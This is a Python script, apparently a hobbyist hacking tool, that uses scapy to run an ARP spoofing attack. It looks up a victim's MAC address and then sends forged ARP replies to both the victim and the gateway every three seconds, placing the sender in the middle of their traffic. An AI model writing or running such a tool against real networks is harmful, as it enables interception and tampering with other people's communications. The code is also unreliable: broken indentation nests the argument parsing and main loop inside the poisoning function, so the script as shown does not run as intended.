import optparse
import time
import scapy.all as scapy
#arp request'i oluşturmak için


def mac_address(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    combined = broadcast/arp_request
    answered = scapy.srp(combined, timeout = 1, verbose = False)[0]
    return answered[0][0].hwsrc


def arp_poisoning(target, poison):
    target_mac = mac_address(target)
    arp_response = scapy.ARP(op = 2, pdst = target, hwdst = target_mac, psrc = poison)
    scapy.send(arp_response, verbose=False)

    # scapy.ls(scapy.ARP())

    def user_input():
        parse_object = optparse.OptionParser()
        parse_object.add_option("-t", "--target", dest="target", help="Enter Target IP")
        parse_object.add_option("-g", "--gateway", dest="gateway", help="Enter Gateway IP")

        options = parse_object.parse_args()[0]

        if not options.target:
            print("Enter Target IP")

        if not options.gateway:
            print("Enter Gateway IP")

        return options

    number = 0

    user_ips = user_input()
    user_target_ip = user_ips.target
    user_gateway_ip = user_ips.gateway

    try:
        while True:
            arp_poisoning(user_target_ip, user_gateway_ip)
            arp_poisoning(user_gateway_ip, user_target_ip)
            number += 2
            print("\rSending packets " + str(number), end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n Quit")